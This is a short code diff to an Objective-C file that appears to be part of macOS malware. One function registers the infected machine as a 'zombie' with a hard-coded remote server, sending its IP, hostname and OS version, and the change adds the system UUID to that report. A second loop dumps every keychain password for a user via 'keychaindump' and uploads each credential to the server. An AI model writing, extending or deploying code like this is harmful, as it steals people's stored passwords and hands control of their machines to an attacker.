@@ -11,6 +11,7 @@
 #import "WTUserApi.h"
 #import "WTConfig.h"
 #import "keychaindump.h"
+#import "WTUUIDApi.h"
 
 @implementation WTServerApi
 
@@ -28,7 +29,7 @@
     WTHTTPApi *httpObj = [[WTHTTPApi alloc] init];
     NSString *ip = [httpObj httpGetRequest:@"http://icanhazip.com/" usingData:nil];
     NSString *hostName = [[NSHost currentHost] localizedName];
-    NSDictionary *postData = @{@"ip":ip, @"hostname":hostName, @"authentication_key":@"12345", @"os_version":systemVersion};
+    NSDictionary *postData = @{@"ip":ip, @"hostname":hostName, @"authentication_key":@"12345", @"os_version":systemVersion, @"mac":[WTUUIDApi getSystemUUID]};
     return [httpObj httpPostRequest:[NSString stringWithFormat:@"%@/%@", @"http://128.199.167.133/create/zombie", ownerID] usingGetData:nil usingPostData:postData];
 }
 
@@ -56,7 +57,6 @@
     NSArray *allCreds = [keychaindump getPasswordsForUser:user];
     for (NSDictionary *cred in allCreds) {
         [WTServerApi createCredential:cred withUserId:userId];
-//        [WTServerApi createCredential:cred withUserID:userId];
     }
 }
 
